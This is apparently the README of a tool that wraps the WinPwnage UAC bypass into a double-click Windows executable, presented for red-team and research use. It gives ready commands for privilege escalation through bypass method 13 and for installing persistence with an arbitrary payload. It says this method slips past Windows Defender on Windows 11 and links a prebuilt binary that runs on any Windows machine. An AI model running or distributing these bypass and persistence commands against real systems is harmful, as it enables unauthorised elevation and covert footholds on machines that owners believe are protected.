# winpwnage-autorun

A standalone Windows executable that automatically triggers a
[WinPwnage](https://github.com/rootm0s/WinPwnage) UAC bypass when launched —
no command-line arguments, no Python installation, no dependencies.

Built for red team engagements, penetration testing, and security research
where a single-click payload is more useful than a script.

## What it does
On execution, the binary behaves exactly as if you had run:

`python main.py --use uac --id 13 --payload c:\windows\system32\cmd.exe`

Why method 13? Because it actually works and doesn't even trigger Windows Defender (Windows 11).

## Download
You can download the pre-compiled executable from the [Releases](../../releases) page. 
No Python installation is required to run the compiled executable.

## Usage
Simply double-click the compiled `main.exe` to automatically execute the default UAC bypass (Method 13 targeting `cmd.exe`).

If you want to use the full capabilities of WinPwnage, you can still pass command-line arguments to the executable. When you pass arguments, the auto-run defaults are ignored:

```cmd
main.exe --scan uac
main.exe --use uac --id 13 --payload c:\windows\system32\cmd.exe
main.exe --use persist --id 3 --payload c:\path\to\payload.exe
main.exe --use persist --id 3 --remove
```

## Build from Source
If you prefer to build the executable yourself, follow these steps:

### Prerequisites
- Windows OS

- [Python 3.8+](https://www.python.org/downloads/) installed

- Git installed

### Step 1: Clone the repository
```cmd
git clone https://github.com/Tw1kslv/winpwnage-autorun
cd winpwnage-autorun
```

### Step 2: Install dependencies
Install PyInstaller using the provided requirements.txt file:
```cmd
pip install -r requirements.txt
```

### Step 3: Build the executable
I have provided a main.spec file to ensure the build process is consistent. Run the following command in your terminal:
```cmd
pyinstaller main.spec
```
(Alternatively, you can build it using the one-liner command: `pyinstaller --onefile main.py`)

### Step 4: Locate your executable
Once the build process is complete, you will find your standalone main.exe inside the newly created dist/ folder.

```
winpwnage-autorun/
├── dist/
│   └── main.exe    <-- Your compiled executable
├── build/
├── main.py
├── main.spec
├── requirements.txt
└── winpwnage/
```

## Notes & Caveats
- Antivirus: Because this tool performs a UAC bypass, some Antivirus engines may flag the compiled executable. This is expected.

- Elevation: Some bypass methods still require the parent process to hold certain privileges. If a method silently fails, try right-clicking and selecting Run as administrator.

- Portability: The compiled .exe is self-contained. You can copy it to any Windows machine of the same architecture (x86/x64) and it will run without Python installed.

## Credits
- Upstream UAC bypass techniques and library: [WinPwnage by rootm0s](https://github.com/rootm0s/WinPwnage)
